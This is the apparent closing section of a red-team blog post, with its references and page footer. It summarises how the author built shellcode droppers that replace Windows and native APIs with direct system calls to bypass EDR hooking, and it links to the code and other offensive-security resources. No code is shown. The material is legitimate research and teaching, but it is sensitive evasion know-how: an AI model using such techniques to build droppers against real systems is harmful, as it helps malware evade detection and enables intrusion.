+<p>The following article explained what a system call basically is, how it works and what it is used for in the Windows operating system. It was also explained that direct system calls are a technique for attackers to bypass the API hooking mechanism used by EDRs. The development of a direct system call dropper was then started. As a base, a high level API dropper was created using the Windows API <code class="inline-code">VirtualAlloc</code>. Next, the Windows APIs were replaced by native APIs for further development into a medium level API dropper. Finally, the actual syscalls dropper was created by replacing all native APIs with direct system calls or by implementing the native APIs and the assembly instructions for the direct system calls directly in the dropper itself.<br><br>In addition, each dropper was checked for plausibility using various tools. For example, in the case of the high level API dropper, the transition from the Windows API <code class="inline-code">VirtualAlloc</code> to the native API <code class="inline-code">NtAllocateVirtualMemory</code> was easily observed. Similarly, with the medium level API dropper, API Monitor could observe that no native APIs were being used correctly. Something similar can be done with the Visual Studio tool dumpbin by checking which Windows APIs are loaded from <code class="inline-code">kernel32.dll</code> into the import address table of the corresponding .exe. For example, the Windows API <code class="inline-code">VirtualAlloc</code> was correctly imported for the high level dropper, but not for the medium and low level droppers.<br><br>Analysis of the droppers with x64dbg was also very revealing. For example, it could be seen that the system calls for the native APIs used were correctly loaded or executed from the .text section of <code class="inline-code">ntdll.dll</code> for the high and medium level droppers. In comparison, for the direct system call dropper (low level APIs), the required system calls for the native APIs used were correctly loaded from the .text section of the dropper itself.<br><br>Personally, I still find the topic of Windows internals, shellcode, malware, EDRs, etc. extremely exciting, my passion for these topics continues unabated, and I look forward to delving deeper into the next topic.<br><br>All <strong>code examples</strong> in this article can also be found on my <strong><a href="https://github.com/VirtualAlllocEx/Direct-Syscalls-A-journey-from-high-to-low" target="_blank" rel="noreferrer noopener">Github account</a></strong>.<br></p>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-red">
+    <div class="content blog-container">
+        <div class="text">
+            <p>Happy Hacking!</p>
+<p>Daniel Feichter <a href="https://twitter.com/VirtualAllocEx" target="_blank" rel="noreferrer noopener">@VirtualAllocEx</a></p>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-grey">
+    <div class="content blog-container">
+        <div class="text">
+            <h3>References&nbsp;</h3>
+<ul><li><a href="https://www.guru99.com/system-call-operating-system.html">https://www.guru99.com/system-...</a></li><li><a href="https://alice.climent-pommeret.red/posts/a-syscall-journey-in-the-windows-kernel/#:~:text=This%20number%20is%20called%20syscall,OS%20versions%20or%20service%20packs">https://alice.climent-pommeret...</a>.</li><li><a href="https://klezvirus.github.io/RedTeaming/AV_Evasion/NoSysWhisper/">https://klezvirus.github.io/Re...</a></li><li><a href="https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/">https://outflank.nl/blog/2019/...</a></li><li><a href="https://twitter.com/re_and_more/status/1510512453800636421?lang=en">https://twitter.com/re_and_mor...</a></li><li><a href="https://www.malwaretech.com/2015/01/inline-hooking-for-programmers-part-1.html">https://www.malwaretech.com/20...</a></li><li><a href="https://www.ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources">https://www.ired.team/offensiv...</a></li><li><a href="https://www.ired.team/offensive-security/code-injection-process-injection/process-injection">https://www.ired.team/offensiv...</a></li><li><a href="https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/">https://outflank.nl/blog/2019/...</a></li><li><a href="https://github.com/jthuraisamy/SysWhispers2">https://github.com/jthuraisamy...</a></li></ul>
+        </div>
+    </div>
+</section>
+                    </div>
+        <div class="blog-info container">
+            <div class="updated">
+                Last updated
+                <span class="desktop">
+                    31.03.24 14:32:06
+                </span>
+                <span class="mobile">
+                    31.03.24
+                </span>
+            </div>
+            <div class="author">
+                Daniel Feichter
+            </div>
+        </div>
+        <div class="further-reading container">
+                                        <div class="heading">
+                    Posts about related Topics
+                </div>
+                        <ul class="blog-list">
+                                    <li class="list-item">
+                        <a href="https://redops.at/en/blog/demo-material-endpoint-security-insights-workshop" class="blog-link">
+    <div class="tag">
+        Workshop
+    </div>
+    <div class="post-date">
+        2026-01-23
+    </div>
+    <div class="blog-title">
+        Demo Material – Endpoint Security Insights Workshop
+    </div>
+    <div class="author">
+        Daniel Feichter
+    </div>
+</a>
+                    </li>
+                                    <li class="list-item">
+                        <a href="https://redops.at/en/blog/training-endpoint-security-insights-shellcode-loaders-and-evasion-fundamentals" class="blog-link">
+    <div class="tag">
+        Workshop
+    </div>
+    <div class="post-date">
+        2026-01-02
+    </div>
+    <div class="blog-title">
+        Training/Workshop - Endpoint Security Insights: Shellcode Loaders &amp; Evasion Fundamentals
+    </div>
+    <div class="author">
+        Daniel Feichter
+    </div>
+</a>
+                    </li>
+                                    <li class="list-item">
+                        <a href="https://redops.at/en/blog/the-emulators-gambit-executing-code-from-non-executable-memory" class="blog-link">
+    <div class="tag">
+        Windows Internals
+    </div>
+    <div class="post-date">
+        2025-10-15
+    </div>
+    <div class="blog-title">
+        The Emulator's Gambit: Executing Code from Non-Executable Memory
+    </div>
+    <div class="author">
+        Daniel Feichter
+    </div>
+</a>
+                    </li>
+                                    <li class="list-item">
+                        <a href="https://redops.at/en/blog/endpoint-security-insights-workshop-option-b-self-paced" class="blog-link">
+    <div class="tag">
+        Workshop
+    </div>
+    <div class="post-date">
+        2025-09-10
+    </div>
+    <div class="blog-title">
+        Endpoint Security Insights Workshop: Option B - Self-Paced
+    </div>
+    <div class="author">
+        Daniel Feichter
+    </div>
+</a>
+                    </li>
+                            </ul>
+        </div>
+    </div>
+        </main>
+        <button type="button" id="BackToTop">Back to top</button>
+        
+
+        
+
+<link href="https://redops.at/dist/assets/main-ioE-islD.css" rel="stylesheet" media="all">
+            
+    
+    <div height="1" width="1" style="position: absolute; top: 0px; left: 0px; border: none; visibility: hidden;" data-original-tag="iframe"></div>
+
+</body></html>
